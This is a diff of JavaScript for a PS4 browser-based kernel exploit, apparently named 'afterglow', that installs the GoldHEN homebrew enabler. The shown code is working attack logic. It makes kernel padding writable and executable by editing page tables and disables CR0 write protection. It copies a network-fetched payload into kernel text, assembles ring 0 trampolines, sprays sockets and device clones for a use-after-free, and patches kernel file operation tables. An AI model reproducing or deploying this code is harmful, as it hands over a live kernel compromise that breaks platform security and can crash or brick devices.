-    say("[rw] kernel_pmap->pm_pml4 is " + (pm ? text(pm) : "unreadable")
-        + ", the calculation says " + text(p4) + " -- nothing written");
-    return null;
-  }
-  say("[rw] dmap " + text(dmap) + ", pml4 " + text(p4) + " confirmed against kernel_pmap");
-
-  /* one entry per level, by index out of the virtual address */
-  const target = kat(PT.padFrom);
-  const i4 = (target.hi >>> 7) & 511;
-  const i3 = (((target.low >>> 30) & 3) | ((target.hi & 127) << 2)) & 511;
-  const i2 = (target.low >>> 21) & 511;
-
-  const viaDmap = function (ent) {               /* entry -> next table, mapped */
-    const pl = (ent.low & 0xfffff000) >>> 0, ph = (ent.hi & 0x000fffff) >>> 0;
-    return v((dmap.low + pl) >>> 0,
-             (dmap.hi + ph + (((dmap.low >>> 0) + pl > 0xffffffff) ? 1 : 0)) >>> 0);
-  };
-
-  const e4 = rd(plus(p4, i4 * 8));
-  if (!e4 || (e4.low & 1) === 0) { say("[rw] pml4 entry " + i4 + " not present"); return null; }
-  const e3at = plus(viaDmap(e4), i3 * 8);
-  const e3 = rd(e3at);
-  if (!e3 || (e3.low & 1) === 0) { say("[rw] pdp entry " + i3 + " not present"); return null; }
-  if ((e3.low & 0x80) !== 0) { say("[rw] the pdp entry is a 1 GiB page -- not handled"); return null; }
-  const e2at = plus(viaDmap(e3), i2 * 8);
-  const e2 = rd(e2at);
-  if (!e2 || (e2.low & 1) === 0) { say("[rw] pd entry " + i2 + " not present"); return null; }
-
-  const big = (e2.low & 0x80) !== 0;
-  if (!big) { say("[rw] the pd entry is not a large page -- the padding is split, not handled"); return null; }
-  /* both ends of the padding have to sit inside this one 2 MiB page */
-  if (((PT.padFrom >>> 21) !== (PT.padTo >>> 21))) {
-    say("[rw] the padding crosses a 2 MiB boundary -- one entry is not enough");
-    return null;
-  }
-  const needRW = (e2.low & 2) === 0;
-  const needNX = (e2.hi & 0x80000000) !== 0;
-  /* compute dmap address of padFrom: phys base from large PDE + page offset */
-  const pPhysLo = (e2.low & 0xFFE00000) >>> 0;
-  const pPhysHi = (e2.hi & 0x000FFFFF) >>> 0;
-  const pOff    = PT.padFrom & 0x1FFFFF;
-  const sumLo   = (dmap.low + pPhysLo + pOff) >>> 0;
-  const carry   = (((dmap.low >>> 0) + pPhysLo + pOff) > 0xFFFFFFFF) ? 1 : 0;
-  const dmapPad = v(sumLo, (dmap.hi + pPhysHi + carry) >>> 0);
-  if (!needRW && !needNX) { say("[rw] the padding already carries RW+X, dmap " + text(dmapPad)); return dmapPad; }
-  if (!needRW && needNX) { say("[rw] padding has RW but NX set -- clearing NX"); }
-
-  const newLo = (e2.low | 2) >>> 0;
-  const newHi = (e2.hi & 0x7fffffff) >>> 0;
-  if (!k.write_v(e2at, v(newLo, newHi))) {
-    say("[rw] the page directory entry is not writable"); return null;
-  }
-  const back = rd(e2at);
-  if (!back || (back.low & 2) === 0) { say("[rw] the RW bit did not stick"); return null; }
-  say("[rw] RW+X set on the pd entry at " + text(e2at) + ", dmap " + text(dmapPad));
-  return dmapPad;
-}
-
-async function loadGoldhen(url, k, kbase, room, vorab) {
-  const c = host();
-  let blob = vorab || null;
-  if (blob === null) {
-    blob = await fetchBytes(url, "g");
-    if (blob === null) return false;
-  }
-
-  if (blob.length !== GH.nlOff + GH.nlLen) {
-    say("[g] " + blob.length + " bytes, expected " + (GH.nlOff + GH.nlLen)
-        + " -- this is not the image this recipe describes");
-    return false;
-  }
-
-  const size = (blob.length + 0x4fff) & ~0xfff;
-  const m = sc(S.mmap, 0, size + 0x1000, 3, 0x1002, -1, 0);
-  const buf = v(m.lo, m.hi);
-  if (m.i32 === -1 || (buf.hi >>> 0) === 0) { say("[g] mmap failed, errno " + c.errno()); return false; }
-  /* touch every page: the kernel writes in here, and a lazily mapped page
-     would fault in ring 0 */
-  for (let o = 0; o <= size; o += 0x1000) wr4(plus(buf, o), 0);
-  if (sc(S.mprotect, buf, size + 0x1000, 7).i32 !== 0) {
-    say("[g] mprotect rwx failed, errno " + c.errno()); return false;
-  }
-  /* Only the trampoline page is ever entered from this mapping. Executability
-     here is per page, and that is measured, not assumed: page 0x47000 carries
-     ring 0 code, page 0 does not -- a three byte probe there took the console
-     (02.11. 14:27). So the gate stub and the trampoline live at 0x47c00/0x47c40
-     and nothing else from this image is ever jumped to. */
-  codeAt(buf, GH.tor).hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
-
-  /* Before ring 0 is sent in there, ask from ring 3. Touching a page with a
-     write gives it RW and no X; an instruction fetch needs another fault to
-     add it, and that fault taken in ring 0 on a userland page is the
-     documented death. A plain `ret` entered with callAddr runs in ring 3
-     instead: if the page carries no X the WebProcess dies and the console
-     does not. Same question, a page instead of a console. */
-  codeAt(buf, GH.tram + 0x200).hex("c3");
-  const r3 = c.callAddr(plus(buf, GH.tram + 0x200), []);
-  if (r3 === undefined || r3 === null) {
-    say("[g] the trampoline page does not execute even in ring 3 -- stopping");
-    return false;
-  }
-  say("[g] trampoline page executes in ring 3, so ring 0 may follow");
-
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    c.p.write8(plus(buf, o), v(lo >>> 0, hi >>> 0));
-  }
-  say("[g] " + blob.length + " bytes at " + text(buf));
-
-  /* the userland side of the gate, exactly as the ring 0 work uses it */
-  const gate = codeAt(buf, GH.tor);
-  gate.hex("4831c0").hex("4989ca").hex("0f05").hex("c3");
-
-
-  let t = null;
-  const tram = { n: 0 };
-  const b1 = function (x) { wr1(plus(buf, GH.tram + tram.n), x); tram.n++; };
-  const hex = function (h) { const u = unhex(h); for (let i = 0; i < u.length; i++) b1(u[i]); };
-  const i32 = function (n) { for (let k = 0; k < 4; k++) b1(Math.floor(n / Math.pow(256, k)) % 256); };
-  const q64 = function (q) { i32(q.low >>> 0); i32(q.hi >>> 0); };
-  const callAbs = function (rva) { hex("48b8"); q64(plus(t, rva)); hex("ffd0"); };
-  const wpOff = function () { hex("0f20c0"); hex("4825"); i32(0xfffeffff); hex("0f22c0"); };
-  const wpOn  = function () { hex("0f20c0"); hex("480d"); i32(0x00010000); hex("0f22c0"); };
-  const fire  = function () {
-    const r = c.callAddr(plus(buf, GH.tor), [11, plus(buf, GH.tram)]);
-    return r.lo >>> 0;
-  };
-  const markClear = function (s2) {
-    wr4(plus(buf, GH.mark + s2 * 8), 0xDEADBEEF);
-    wr4(plus(buf, GH.mark + s2 * 8 + 4), 0xDEADBEEF);
-  };
-  const markRead = function (s2) {
-    return [rd4(plus(buf, GH.mark + s2 * 8)), rd4(plus(buf, GH.mark + s2 * 8 + 4))];
-  };
-
-  /* The Lua chain ran a 641 byte kernel patch set before any of this, and
-     afterglow's fifteen are not the same set: the blob writes to 51 places,
-     of which afterglow covers 25. The thirty it does not -- a block around
-     0x125791 and three singles -- are what GoldHEN's own code expects to
-     find. The blob is position independent, takes no arguments, fetches the
-     kernel base itself through rdmsr and ends in ret, so it only has to be
-     put somewhere ring 0 may run from. This mapping is, as just measured. */
-  /* It does not go into this mapping. The Lua chain puts it in the libc text
-     tail at rva 0x130730 -- the same room afterglow runs its own ring 0
-     bodies from, and the only region here that is proven executable in ring 0
-     by every call made so far. The three byte test above proved the page at
-     +0x47000 and said nothing about any other, which is exactly the trap the
-     Lua notes warn about: one page in eighteen. 641 bytes fit in the body
-     area, +0xc0 to +0x400. afterglow rebuilds that body on its next use. */
-  if (!(await runPatchSet(room, k, kbase))) return false;
-
-  /* The Lua chain calls 0x144d and 0xce9 here. Their job is to work out the
-     kernel base and leave it at +0x47b20, which step 4 then reads back -- we
-     have had that base since [1] and it was checked against the gate at [7],
-     so the two calls buy nothing.
-
-     Skipping them is also what keeps this safe. They sit at image offset
-     0x144d, on the mapping's second page; the trampoline sits at 0x47c40, on
-     a page every call so far has already run from. Executability here is per
-     page -- the Lua notes measured one page in eighteen on an allocator
-     buffer -- and the three byte test proves only the page it ran on. With
-     these two gone, the only code entered from this mapping is the
-     trampoline, and everything else runs from the kernel's own padding. */
-  /* The pre-stage calls 0x144d and 0xce9 only to work out the kernel base and
-     leave it at +0x47b20. We have had that base since [1] and checked it
-     against the gate at [7], and those two sit on a page ring 0 may not run
-     from -- so they stay skipped and the value is written as they would have
-     left it. */
-  const kb = kbase;
-  t = plus(kb, GH.rvaPad);
-  wr8(plus(buf, GH.kptr), plus(kb, GH.rvaKmem));
-  say("[g] kernel base " + text(kb) + " (from the exploit), padding " + text(t));
-
-  /* before a single byte of GoldHEN goes into the padding */
-  if (!paddingRW(k, kb)) { say("[g] stopping: the padding would stay read only"); return false; }
-
-  /* the payload goes into the kernel's padding, not into a thread */
-  tram.n = 0;
-  wpOff();
-  hex("48be"); q64(plus(buf, GH.nlOff));
-  hex("48bf"); q64(t);
-  hex("b9"); i32(GH.nlLen);
-  hex("fc"); hex("f3a4");
-  wpOn();
-  hex("b8"); i32(0x5758); hex("c3");
-  const cp = fire();
-  if (cp !== 0x5758) { say("[g] copy into the padding returned 0x" + cp.toString(16)); return false; }
-  say("[g] [3] " + GH.nlLen + " bytes into the padding");
-
-  let good = 0, silent = 0;
-  for (let n = 0; n < GH_STEPS.length; n++) {
-    const rva = GH_STEPS[n][0], what = GH_STEPS[n][1], o = GH_STEPS[n][2] || {};
-    markClear(0);
-    tram.n = 0;
-    wpOff();
-    if (o.rdi !== undefined) { hex("48bf"); q64(plus(t, o.rdi)); }
-    if (o.esi !== undefined) { hex("be"); i32(o.esi); }
-    hex("31c0");
-    if (o.ptr) { hex("48b8"); q64(plus(t, rva)); hex("488b00"); hex("ffd0"); }
-    else callAbs(rva);
-    hex("4898");
-    hex("48b9"); q64(plus(buf, GH.mark));
-    hex("488901");
-    wpOn(); hex("31c0"); hex("c3");
-    fire();
-    const mk = markRead(0);
-    if (mk[1] === 0xDEADBEEF) {
-      say("[g] [" + (n + 1) + "] 0x" + rva.toString(16) + " did NOT come back -- " + what);
-      silent++;
-    } else {
-      let rc = mk[0];
-      if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
-      good++;
-      if (rc !== 0) say("[g] [" + (n + 1) + "] 0x" + rva.toString(16) + " rc=" + rc
-                        + (rc === 3 ? " (target already injected)" : ""));
-    }
-  }
-  say("[g] " + good + " of " + GH_STEPS.length + " calls returned, " + silent + " silent");
-  return silent === 0;
-}
-
-/* ------------------------------------------------- defusing the handles */
-
-/* Every attempt leaves device handles and a queue behind. Closing them during
-   the run kills the console; leaving them kills it when the process dies,
-   because neither teardown finishes -- the device close ends in
-   destroy_dev_sched, and closing a queue walks its notes and detaches each
-   one from a device that is gone.
-
-   So neither path is taken. Both operation tables are copied into the zero
-   filled tail of kernel text, the close entry of each copy is pointed at an
-   `xor eax,eax ; ret`, and the handles are rehung onto the copies. The cdevs
-   leak until reboot, which is harmless.
-
-   In a browser this is not optional and not something to do later: the page
-   can go away at any moment, and that moment is the one that hangs. */
-const PADDING = 0x0b3a300;            /* 14.02: 0xb39d98 is .eh_frame; text padding gap starts 0xb3a298 */
+const PADDING = 0x0b3a300;
 const OFF_STUB = 0x100, OFF_DEVS = 0x110, OFF_QUEUES = 0x170;
-const RET0 = 0x00c3c031;             /* xor eax,eax ; ret */
+const RET0 = 0x00c3c031;
 
-/* The rehang used to be two ring 0 reads and sometimes a write per handle,
-   each its own gate entry -- some 660 of them for 220 handles, in a row. The
-   same arithmetic as the spray: put the loop in ring 0 and it is one entry.
-   The two bodies below were checked against a disassembler before they were
-   ever sent, because a wrong jump displacement here is a dead console. */
 function rehangRing0(k, room, ofs, list, from, copy) {
   if (!list.length || list.length > 256 || !from) return null;
   for (let i = 0; i < list.length; i++) wr4(plus(room, STAGE + i * 4), list[i]);
   const c = k.begin();
-  c.hex("31c0");                                   /* moved = 0 */
-  c.hex("48be").qw(plus(room, STAGE));             /* rsi = the fd list */
-  c.hex("48b9").qw(splitNum(list.length));         /* rcx = how many */
-  c.hex("49b8").qw(ofs);                           /* r8  = open file array */
-  c.hex("49b9").qw(from);                          /* r9  = the table to replace */
-  c.hex("49ba").qw(copy);                          /* r10 = our copy */
+  c.hex("31c0");
+  c.hex("48be").qw(plus(room, STAGE));
+  c.hex("48b9").qw(splitNum(list.length));
+  c.hex("49b8").qw(ofs);
+  c.hex("49b9").qw(from);
+  c.hex("49ba").qw(copy);
   c.hex("4885c9").hex("7421").hex("486316").hex("4883c604").hex("48ffc9");
   c.hex("4d8b1cd0").hex("4d85db").hex("74e8").hex("4d394b08").hex("75e2");
   c.hex("4d895308").hex("ffc0").hex("ebda");
@@ -1720,9 +921,7 @@ function teardown(k, kbase, ofs, devs, queues, room) {
   const there = k.read_v(stub);
   if (!there) { say("[t] kernel text not readable at " + text(stub)); return false; }
   say("[t] it holds " + text(there));
-  if ((there.low >>> 0) === (RET0 >>> 0)) {
-    say("[t] the stub is already there from an earlier run");
-  } else if (isZero(there)) {
+  if (isZero(there)) {
     if (!k.write_v(stub, v(RET0, 0))) { say("[t] kernel text not writable"); return false; }
     const back = k.read_v(stub);
     if (!back || (back.low >>> 0) !== (RET0 >>> 0)) { say("[t] the stub did not stick"); return false; }
@@ -1731,19 +930,30 @@ function teardown(k, kbase, ofs, devs, queues, room) {
   }
 
   const clone = function (from, to, what) {
+    const prior = k.read(to, 0x58);
+    let clean = !!prior;
+    if (prior) for (let i = 0; i < prior.length; i++) if (prior[i] !== 0) clean = false;
+    if (!clean) {
+      say("[t] " + what + " destination is not pristine"); return false;
+    }
     for (let i = 0; i <= 10; i++) {
       let q = k.read_v(plus(from, i * 8));
       if (!q) { say("[t] " + what + " unreadable at +0x" + (i * 8).toString(16)); return false; }
-      if (i === 7) q = stub;                       /* fo_close */
+      if (i === 7) q = stub;
       if (!k.write_v(plus(to, i * 8), q)) { say("[t] " + what + " not writable"); return false; }
     }
-    const c = k.read_v(plus(to, 0x38));
-    return c !== null && same(c, stub);
+    for (let i = 0; i <= 10; i++) {
+      const original = k.read_v(plus(from, i * 8));
+      const copied = k.read_v(plus(to, i * 8));
+      if (!original || !copied ||
+          !same(copied, i === 7 ? stub : original)) {
+        say("[t] " + what + " copy mismatch at +0x" + (i * 8).toString(16));
+        return false;
+      }
+    }
+    return true;
   };
 
-  /* Taking the table from the first handle is wrong on a second run: that one
-     already points at our copy, and every handle still on the original would
-     then look foreign and be skipped. */
   const original = function (list, copy) {
     for (let i = 0; i < list.length; i++) {
       const f = fileOf(list[i]);
@@ -1789,22 +999,18 @@ function teardown(k, kbase, ofs, devs, queues, room) {
   }
   say("[t] " + movedq + " of " + (queues ? queues.length : 0) + " queues on the copy");
 
-  /* A neutralised close entry is not the whole story: exit1() also runs
-     knote_fdclose() for every descriptor, and that does not go through
-     fo_close. Our notes hang on clones freed long ago, so walking them at
-     exit reads dead memory. kqueue_close takes the note array length from
-     the high half of the quadword at kq+0xa0; with it at zero nothing is
-     walked at all. */
   let notes = 0;
   for (let i = 0; queues && i < queues.length; i++) {
     const f = fileOf(queues[i]);
     if (!f || !inHeap(f)) continue;
-    const kq = k.read_v(f);                        /* f_data sits at the front */
+    const kq = k.read_v(f);
     if (!kq || !inHeap(kq)) continue;
     const w = k.read_v(plus(kq, 0xa0));
     if (!w) continue;
-    if ((w.hi >>> 0) !== 0) { if (k.write_v(plus(kq, 0xa0), v(w.low, 0))) notes++; }
-    else notes++;
+    if ((w.hi >>> 0) !== 0) k.write_v(plus(kq, 0xa0), v(w.low, 0));
+    const cleared = k.read_v(plus(kq, 0xa0));
+    if (cleared && (cleared.hi >>> 0) === 0 &&
+        (cleared.low >>> 0) === (w.low >>> 0)) notes++;
   }
   say("[t] note lists emptied on " + notes + " of " + (queues ? queues.length : 0) + " queues");
 
@@ -1817,15 +1023,27 @@ function teardown(k, kbase, ofs, devs, queues, room) {
       if (!(cur && same(cur, dtab))) left++;
     }
   }
-  if (left === 0 && moved > 0) { say("[t] all " + devs.length + " handles are on the copy"); return true; }
-  say("[t] " + left + " handles are still on the original -- the page must not go away");
+  let queueLeft = 0;
+  for (let i = 0; queues && i < queues.length; i++) {
+    const f = fileOf(queues[i]);
+    const cur = f && inHeap(f) ? k.read_v(plus(f, 0x08)) : null;
+    if (!cur || !same(cur, qtab)) queueLeft++;
+  }
+  const queueCount = queues ? queues.length : 0;
+  const safe = devs.length > 0 && left === 0 && moved > 0 &&
+    movedq === queueCount && queueLeft === 0 && notes === queueCount &&
+    ready(dtab) && (queueCount === 0 || ready(qtab));
+  if (safe) {
+    say("[t] verified all " + devs.length + " device handles and " +
+      queueCount + " queue handles/notes defused");
+    return true;
+  }
+  say("[t] incomplete teardown: devices left=" + left + " queues left=" +
+      queueLeft + " moved=" + movedq + "/" + queueCount +
+      " notes=" + notes + "/" + queueCount + "; cold power off");
   return false;
 }
 
-/* ------------------------------------------------------------ the probe */
-
-/* No UAF trigger or kernel-memory write. It holds APM clones open until this
-   browser process exits, so a cold reboot is required before a later run. */
 export function probeAfterglow(ctx) {
   STATE.ctx = ctx;
   const out = { ok: false, reasons: [] };
@@ -1870,38 +1088,24 @@ export function probeAfterglow(ctx) {
   let node = null;
   for (let i = 0; i < PROBE_NODES.length; i++) {
     const fd = sc(S.open, cstr(PROBE_NODES[i]).at, 0).i32;
-    if (fd >= 0) {
-      node = PROBE_NODES[i];
-      if (sc(S.close, fd).i32 !== 0) no("probe descriptor did not close");
-      break;
-    }
+    if (fd >= 0) { node = PROBE_NODES[i]; break; }
   }
   out.probeNode = node;
   if (!node) no("no usable device node for the probe descriptor");
 
-  /* /dev/apm is a cloning node: each open makes a new numbered unit, and that
-     unit exists only while the descriptor is held. So they are not a resource
-     the sandbox hands out -- we make them. Held open on purpose here; closing
-     one is what frees its clone, and that is the free the exploit needs, not
-     something to do while counting. */
   const held = [];
   for (let i = 0; i < 20; i++) {
     const fd = sc(S.open, cstr("/dev/apm").at, 0).i32;
     if (fd < 0) break;
     held.push(fd);
   }
-  out.rebootRequired = held.length > 0;
-  out.clonesHeld = held.length;
   out.apm = held.length ? (held.length + " clones held") : ("refused, errno " + host().errno());
   if (!held.length) no("/dev/apm cannot be opened in this sandbox");
 
   const open = [], refused = [];
   for (let u = 0; u < 32; u++) {
     const fd = sc(S.open, cstr("/dev/apm" + u).at, 0).i32;
-    if (fd >= 0) {
-      open.push(u);
-      if (sc(S.close, fd).i32 !== 0) no("APM unit " + u + " did not close");
-    }
+    if (fd >= 0) { open.push(u); sc(S.close, fd); }
     else if (refused.length < 3) refused.push(u + ":e" + host().errno());
   }
   out.units = open.length;
@@ -1914,154 +1118,166 @@ export function probeAfterglow(ctx) {
   if (!pin.ok) no("cannot pin to a cpu: " + pin.note);
 
   const socks = [];
-  out.udp = 0;
-  try {
-    for (let i = 0; i < TUNE.sprays; i++) {
-      const fd = sc(S.socket, 2, 2, 0).i32;
-      if (fd < 0) break;
-      socks.push(fd);
-    }
-    out.udp = socks.length;
+  for (let i = 0; i < TUNE.sprays; i++) {
+    const fd = sc(S.socket, 2, 2, 0).i32;
+    if (fd < 0) break;
+    socks.push(fd);
+  }
+  out.udp = socks.length;
 
-    /* Setting this option allocates in the same zone, but no APM clone has
-       been freed, so there is no UAF hole to win. */
-    if (socks.length) {
-      const body = alloc(TUNE.object); body.u8.fill(0);
-      const req = alloc(40);
-      req.dv.setUint32(0, 1, true);
-      pokeAt(req, 8, alloc(16).at);
-      req.dv.setUint32(16, 16, true);
-      pokeAt(req, 24, body.at);
-      req.dv.setUint32(32, TUNE.object, true);
-      const stub = stubFor(S.setsockopt);
-      const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
-      let t0, t1;
-      if (nb) {
-        const calls = [];
-        for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
-        const fertig = [];
-        for (let i = 0; i < calls.length; i += nb) {
-          try { fertig.push(host().prepareMany(calls.slice(i, i + nb))); }
-          catch (e) { fertig.length = 0; break; }
-        }
-        if (fertig.length) {
-          host().runPrepared(fertig[0]);
-          t0 = performance.now();
-          for (let i = 0; i < fertig.length; i++) host().runPrepared(fertig[i]);
-          t1 = performance.now();
-          out.window = (t1 - t0).toFixed(2) + " ms in " + fertig.length + " entries";
-        }
+  if (socks.length) {
+    const body = alloc(TUNE.object); body.u8.fill(0);
+    const req = alloc(40);
+    req.dv.setUint32(0, 1, true);
+    pokeAt(req, 8, alloc(16).at);
+    req.dv.setUint32(16, 16, true);
+    pokeAt(req, 24, body.at);
+    req.dv.setUint32(32, TUNE.object, true);
+    const stub = stubFor(S.setsockopt);
+    const nb = (host().prepareMany && host().runPrepared && stub) ? (STATE.batch || TUNE.batch) : 0;
+    let t0, t1;
+    if (nb) {
+      const calls = [];
+      for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
+      const fertig = [];
+      for (let i = 0; i < calls.length; i += nb) {
+        try { fertig.push(host().prepareMany(calls.slice(i, i + nb))); }
+        catch (e) { fertig.length = 0; break; }
       }
-      if (out.window === undefined) {
-        t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
-        for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
-        t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
-        out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
+      if (fertig.length) {
+        host().runPrepared(fertig[0]);
+        t0 = performance.now();
+        for (let i = 0; i < fertig.length; i++) host().runPrepared(fertig[i]);
+        t1 = performance.now();
+        out.window = (t1 - t0).toFixed(2) + " ms in " + fertig.length + " entries";
       }
-      let accepted = 0;
-      for (let i = 0; i < socks.length; i++)
-        if (sc(S.setsockopt, socks[i], 17, 128, req.at, 40).i32 === 0) accepted++;
-      out.optionsAccepted = accepted;
-      if (accepted < TUNE.sprays)
-        no("only " + accepted + " socket options succeeded, " + TUNE.sprays + " needed");
-    } else out.window = "not measured";
-    if (socks.length < TUNE.sprays)
-      no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
-  } catch (error) {
-    no("socket check stopped: " + (error && error.message ? error.message : String(error)));
-  } finally {
-    for (let i = 0; i < socks.length; i++) {
-      try { if (sc(S.close, socks[i]).i32 !== 0) no("socket close failed"); }
-      catch (_) { no("socket close threw"); }
     }
-    out.pinRestored = true;
-    if (pin.originalMask) {
-      try {
-        const original = alloc(16);
-        original.u8.set(pin.originalMask);
-        out.pinRestored = sc(S.cpuset_setaffinity, 3, 1, -1, 16, original.at).i32 === 0;
-      } catch (_) { out.pinRestored = false; }
-      if (!out.pinRestored) no("CPU affinity was not restored");
+    if (out.window === undefined) {
+      t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
+      for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
+      t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
+      out.window = (t1 - t0).toFixed(1) + " ms, one entry each (no batching)";
     }
+  } else out.window = "not measured";
+
+  for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
+  if (socks.length < TUNE.sprays) {
+    no("only " + socks.length + " udp sockets, " + TUNE.sprays + " is a hard floor");
   }
 
   out.ok = out.reasons.length === 0;
-  /* one item per line: the console log pane cuts at the right edge, and the
-     number this whole exercise is about was the one falling off it */
   say("probe libc   " + out.libc);
   say("probe gadget " + out.gadgets + ", tail " + out.tail);
   say("probe apm    " + out.apm + ", node " + out.probeNode);
   say("probe units  " + out.units + " open: " + out.unitList);
   say("probe refused " + out.unitRefused);
   say("probe pin    " + out.pin);
-  say("probe restore " + (out.pinRestored ? "original CPU affinity" : "FAILED"));
   say("probe window " + out.window);
   say("probe UDP    " + out.udp + " of " + TUNE.sprays + " needed");
-  say("probe option " + (out.optionsAccepted || 0) + " of " + TUNE.sprays + " succeeded");
   say("probe SHOTS  " + out.units + " units, a run needs 3");
   if (out.ok) say("probe VERDICT usable");
   else for (let i = 0; i < out.reasons.length; i++) say("probe BLOCKED " + out.reasons[i]);
   return out;
 }
 
-/* --------------------------------------------------------------- the run */
-
 async function attempt(ctx, opts) {
   STATE.ctx = ctx;
   opts = opts || {};
   STATE.retry = false;
-  if (ctx.firmware === "14.02") {
-    say("afterglow -- firmware 14.02 GoldHEN route disabled after hardware kernel panic; stopping before the kernel stage");
+  STATE.terminalReleaseAttempted = false;
+  if (!CANDIDATE_READY) {
+    say("[p] corrected 14.02 HEN launch paused pending host review");
     return false;
   }
-  if (ctx.firmware !== "14.00") {
-    say("afterglow -- firmware " + (ctx.firmware || "unknown")
-        + " is not enabled in this release; stopping before the kernel stage");
+  if (ctx.firmware !== "14.02") {
+    say("corrected HEN launch is restricted to firmware 14.02");
     return false;
   }
-  const patchWindows = ctx.firmware === "14.02" ? PATCH_WINDOWS_1402 : null;
-  const patches = patchWindows
-    ? patchWindows.map(function (p2) { return [p2[0], p2[2], p2[3]]; })
-    : PATCHES_1400.map(function (p2) { return [p2[0], p2[1], p2[2]]; });
-  const bootstrapHex = ctx.firmware === "14.02" ? BOOTSTRAP_1402 : BOOTSTRAP_1400;
-  say("afterglow -- ps4 kernel exploit, firmware 14.00 (verified GoldHEN route)");
+  say("afterglow -- starting a 14.02 HEN shot");
+  const henBytes = await fetchBytes("hen-1402-core.bin", "p");
+  if (!henBytes || henBytes.length !== HEN_BIN.length ||
+      sha256Hex(henBytes) !== HEN_BIN.sha256) {
+    say("[p] corrected HEN SHA-256 or length mismatch -- no kernel shot fired");
+    return false;
+  }
+  say("[p] corrected HEN SHA-256 verified before kernel stage");
 
   const missing = seedStubs();
   if (missing.length) {
     say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
     return false;
   }
-
-  /* the free and the refill have to happen on one core, or they land in
-     different per cpu buckets and the hole is never refilled */
-  const pin = pinCore();
-  if (!pin.ok) {
-    say("  cpu pin failed (" + pin.note + ") -- refusing to go on.");
-    say("  Unpinned, the free and the refill land in different per cpu buckets,");
-    say("  the hole is filled by somebody else, and ring 0 continues on that");
-    say("  stranger's stack pointer. That is a dead console, not a bad run.");
-    return false;
+  /* The completion file is the payload's only positive postcondition. Check
+     it before using the RWX probe so an allocation failure cannot hide a
+     confirmed install. Any error other than ENOENT is an unknown state. */
+  const completionPath = cstr("/user/temp/hen.installed");
+  const completionFd = sc(S.open, completionPath.at, 0).i32;
+  const completionErrno = completionFd < 0 ? host().errno() : 0;
+  if (completionFd >= 0) {
+    const markerClosed = sc(S.close, completionFd).i32 === 0;
+    say("[p] core HEN completion marker found on this boot");
+    await checkpoint("HEN-INSTALLED",
+      "/user/temp/hen.installed is present; close=" + markerClosed);
+    notifyHenRunning();
+    return {
+      payload: true, threadStarted: false, defused: true,
+      installed: true, alreadyOpen: true,
+    };
   }
-  say("  pinned to core " + pin.core + " of [" + pin.allowed + "]");
-
-  /* Is the kernel already open? A reload on a console that has been done once
-     would otherwise burn triggers against a kernel that is already patched --
-     and the enabler restarting SceShellUI is exactly what makes the browser
-     reload. rwx mmap is the cheapest question that only answers yes after a
-     successful run. */
-  {
-    const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
-    if (m0.i32 !== -1 && sc(S.mprotect, v(m0.lo, m0.hi), 0x4000, 7).i32 === 0) {
-      say("  this kernel is already open -- a run has succeeded on this boot.");
-      say("  Not firing again; reboot the console for a fresh one.");
-      return false;
-    }
+  if (completionErrno !== 2) {
+    say("[p] HEN marker could not be checked, errno " + completionErrno +
+      " -- kernel state is unknown");
+    await checkpoint("HEN-MARKER-ERROR", "open errno=" + completionErrno);
+    return {
+      payload: false, threadStarted: false, installed: false,
+      defused: false, unknown: true,
+    };
   }
+
+  const m0 = sc(S.mmap, 0, 0x4000, 3, 0x1002, -1, 0);
+  if (m0.i32 === -1 || (m0.hi >>> 0) === 0) {
+    const probeErrno = host().errno();
+    say("[p] kernel-state probe mmap failed, errno " + probeErrno +
+      " -- no exploit or HEN thread started");
+    await checkpoint("KERNEL-STATE-UNKNOWN", "mmap errno=" + probeErrno);
+    return {
+      payload: false, threadStarted: false, installed: false,
+      defused: false, unknown: true,
+    };
+  }
+  const probeAt = v(m0.lo, m0.hi);
+  const probeProtect = sc(S.mprotect, probeAt, 0x4000, 7).i32;
+  const probeProtectErrno = probeProtect === 0 ? 0 : host().errno();
+  const probeUnmap = sc(S.munmap, probeAt, 0x4000).i32;
+  if (probeUnmap !== 0)
+    say("[p] kernel-state probe mapping did not unmap, errno " + host().errno());
+
+  if (probeProtect === 0) {
+    say("[p] kernel RWX is already open but the core HEN marker is absent");
+    say("[p] refusing to rewrite a live HEN payload or start a second installer thread");
+    await checkpoint("HEN-STATE-UNKNOWN",
+      "kernel-rwx=open; marker errno=2; no installer started");
+    return {
+      payload: false, threadStarted: false, installed: false,
+      defused: true, alreadyOpen: true, unknown: true,
+    };
+  }
+  say("[p] stock RWX probe rejected as expected, errno " + probeProtectErrno);
 
   let lib = findLib("libSceLibcInternal.sprx");
   if (!lib.base) lib = findLibByShape();
   const libc = lib.base;
   if (!libc) { say("  " + (lib.note || "libc is not mapped")); return false; }
+  const shape = findLibByShape();
+  if (!shape.base || !same(shape.base, libc) || !MAPS || !MAPS.length) {
+    say("  live userland map listing did not confirm libc or map order");
+    return false;
+  }
+  STATE.pthread = resolvePthreadCreate();
+  if (!STATE.pthread) {
+    say("[p] pthread_create import failed live mapping checks; no kernel shot fired");
+    return false;
+  }
 
   const gad = {};
   for (const name in GADGETS) {
@@ -2074,136 +1290,178 @@ async function attempt(ctx, opts) {
     gad[name] = at;
   }
 
+  /* Choose the descriptor strategy before the first kernel shot. The browser
+     may start at a 512-fd soft limit; raise it only as far as the process's
